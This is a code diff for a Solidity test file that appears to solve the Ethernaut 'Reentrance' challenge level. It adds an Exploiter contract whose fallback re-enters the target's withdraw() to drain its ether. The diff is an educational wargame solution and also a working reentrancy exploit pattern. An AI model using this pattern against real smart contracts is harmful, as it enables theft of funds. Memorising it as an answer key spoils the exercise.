@@ -35,14 +35,33 @@ contract TestReentrance is BaseTest {
     }
 
     function exploitLevel() internal override {
-        /** CODE YOUR EXPLOIT HERE */
+        vm.startPrank(player);
 
-        vm.startPrank(player, player);
-
-        // check that the victim has no more ether
-
-        // check that the player has all the ether present before in the victim contract
-
+        Exploiter re = new Exploiter(level);
+        level.donate{value: 0.001 ether}(address(re));
+        re.exploit(0.001 ether);
         vm.stopPrank();
+    }
+}
+
+contract Exploiter {
+    bool internal _lock;
+    Reentrance internal _target;
+
+    constructor(Reentrance target) public {
+        _lock = false;
+        _target = target;
+    }
+
+    function exploit(uint256 amount) public {
+        _target.withdraw(amount);
+    }
+
+    fallback() external payable {
+        if (!_lock) {
+            _lock = true;
+            _target.withdraw(msg.value);
+            _lock = false;
+        }
     }
 }
